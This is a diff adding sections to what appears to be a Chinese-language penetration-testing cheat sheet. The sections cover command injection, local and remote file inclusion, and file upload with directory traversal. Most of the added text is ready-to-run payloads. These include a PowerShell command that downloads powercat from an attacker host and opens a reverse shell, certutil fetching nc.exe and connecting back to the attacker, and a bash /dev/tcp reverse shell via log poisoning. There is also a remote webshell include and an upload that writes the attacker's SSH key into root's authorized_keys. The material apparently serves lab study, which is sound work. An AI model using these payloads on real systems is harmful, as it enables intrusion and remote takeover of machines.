@@ -208,7 +208,47 @@ fetch(`/getflag\)
     ```
     {% endraw %}
 
-    
+#### Command Injection
+找到注入點之後可以用以下 payload 判斷對方使用的是哪一個 shell
+* 如果是 CMD: 會輸出 `CMD`
+    ```bash
+    (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+    ```
+* 如果是 Powershell 則會輸出 `Powershell`
+    ```powershell
+    (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+    ```
+* 實際範例
+    ```bash
+    $ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
+    ```
+* 上傳 webshell 的 Payload
+    * Powershell:
+        ```powershell
+        $ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/powercat.ps1');powercat -c KALI_IP -p 4444 -e cmd"
+        ```
+
+        步驟:
+        ```bash
+        $ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+        $ python -m http.server 80
+        ```
+        ```bash
+        $ nc -nvlp 4444
+        ```
+        ```bash
+        $ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<攻擊者IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<攻擊者IP>%20-p%204444%20-e%20powershell' http://<受害者IP>/archive
+        ```
+    * CMD: 這個方法不見得有用，因為可能我們
+        ```bash
+        # 第一次: 下載到一個指定地址
+        # certutil -urlcache -split -f http://<攻擊者IP>/nc.exe C:\Windows\Temp\nc.exe
+        $ curl -X POST --data 'Archive=git%3Bcertutil%20-urlcache%20-split%20-f%20http%3A%2F%2F<攻擊者IP>%2Fnc.exe%20C%3A%5CWindows%5CTemp%5Cnc.exe' http://<受害者IP>/archive
+
+        # 第二次: 實際執行
+        # C:\Windows\Temp\nc.exe -e cmd.exe <攻擊者IP> 4444
+        $ curl -X POST --data 'Archive=git%3BC%3A%5CWindows%5CTemp%5Cnc.exe%20-e%20cmd.exe%20<攻擊者IP>%204444' http://<受害者IP>/archive
+        ```
 
 ### LFI
 * 前提: 在 PHP 中需要特別啟用 `allow_url_include`
@@ -282,6 +322,18 @@ $ nc -lvnp 4444
 bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
 ↓
 $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<攻擊者IP>%2F4444%200%3E%261%22" 
+```
+
+### RFI
+和 LFI 的差別就是， RFI 弱點是可以讀到**外部**的 file，所以我們可以嘗試在 local 端建一個 http server，讓 victim server 連自己的 http server 拿到 webshell 並且實際執行指令
+```bash
+$ cd /usr/share/webshells/php/ # 先定位在有 webshell 的地方，確保目錄底下有想要上傳的 webshell
+$ python3 -m http.server 80 # 建立一個 http server
+```
+
+已知 victim server 有 RFI 弱點，就可以讓他連自己的 IP 拿 webshell
+```bash
+$ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>/simple-backdoor.php&cmd=ls"
 ```
 
 ### Deserialization
@@ -366,6 +418,45 @@ create一個偽造的payload和一個對外的中間server溝通，並讓這個�
 * 改 Content-Typebypass: `IMAGETYPE`(加入合法的File Signature) + bypass file type(修改封包header)
 * 雙重副檔名: `shell.jsp.jpg`（若 server 解析第一個副檔名）或 `shell.jpg.jsp`
 * 如果只能插入在 Image 中，通常會插在 IEND 後面，如果 response 的 Content-Type 不是 `image/png` 而是 `text/html` ，他會執行後面的 webshell payload
+
+#### 利用 Upload + Directory Traversal 上傳 ssh pub key
+* 最大的前提是: web server 是以 root 這種高權限運行，在使用自帶 web server 的程式語言（如 Go、Node.js、Python）中很常見，因為開發者或管理員為了省事，直接用 root 啟動應用來避免權限問題。相比之下，傳統的 web server 如 Apache 或 Nginx 通常以低權限使用者（如 www-data）運行，IIS 則用 Network Service 或 Application Pool Identity。這些帳號無法寫入 /root/ 目錄，所以同樣的攻擊就不會成功
+
+1. 先確認上傳的漏洞，使用 `../` 或是 `%2e%2e/` 或 `....//` 可以成功，代表後端沒有驗證，確認有 path traversal
+1. 產自己的 ssh key
+    ```bash
+    $ ssh-keygen -t rsa
+    $ cat ~/.ssh/id_rsa.pub
+    ssh-rsa AAAAB3Nza...
+    ```
+2. 在已知有 upload 功能並且有 path traversal 漏洞的情況下，上傳自己的 ssh rsa public key ，在封包中修改
+    ```bash
+    POST /upload HTTP/1.1
+    Host: 192.168.232.16:8000
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate, br
+    Content-Type: multipart/form-data; boundary=----geckoformboundary29e1e2328f421e5f75d7ef823f471fd
+    Content-Length: 820
+    Origin: http://192.168.232.16:8000
+    Connection: keep-alive
+    Referer: http://192.168.232.16:8000/
+    Upgrade-Insecure-Requests: 1
+    Priority: u=0, i
+
+    ------geckoformboundary29e1e2328f421e5f75d7ef823f471fd
+    Content-Disposition: form-data; name="myFile"; filename="../../../../../root/.ssh/authorized_keys"
+    Content-Type: application/octet-stream
+
+    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDINaM83V9eNyN3e+ZQ2de5qNxWNQ9LHR9+Ki9aNRwX7sm9yWR8xg03FdPIo/Cqn47WV8D+EXMAKmaVU2bw9XbdYqLYT7L3iEO8IJ5w8p+iyBDX+HNUHaF5fTfYJ4eqbfXQhdTo3igceXjjGZwBBaAP0QAISmyH016eA0Duwk4Sny26rG+XSObA0QUupgYc+5J/ZHUq83Q9qlw0gh3N3egZxwoYgekjxX6ddLWkwbKIFhBmUqxfoRi0FWxcSwQlkuMpI7hEqBhXFojdFRmp0mcy1qNupQybXoA57S3G/sW4kyCEQS0ELaWVWokPBNS+02sPoXzXgtWKZhKYMGVBJRY21oIs6ANAT89ivBwer8WqwP+9vlVR3O1AIlSs9KZeqP7yjXHm1I0r4qesa6tHWKHozQCFdEGHvO2o+u/farz7d44bIdO6Hk9NHv9XR/7sqmaLNYQl3FdqyNAQRFB5XnIN4ASiLhgXpHKWcmW+QDZvbZi8+mnd4bMuXTKShxhD5m8= kali@kali
+    ------geckoformboundary29e1e2328f421e5f75d7ef823f471fd--
+    ```
+3. 只要上傳成功，就可以以 root 身份登入
+    ```bash
+    $ ssh root@192.168.232.16 -p 2222
+    root@704d6605d487:~#
+    ```
 
 #### JSP
 如果是 JSP 系統，有以下幾個 Payload 可以試看看
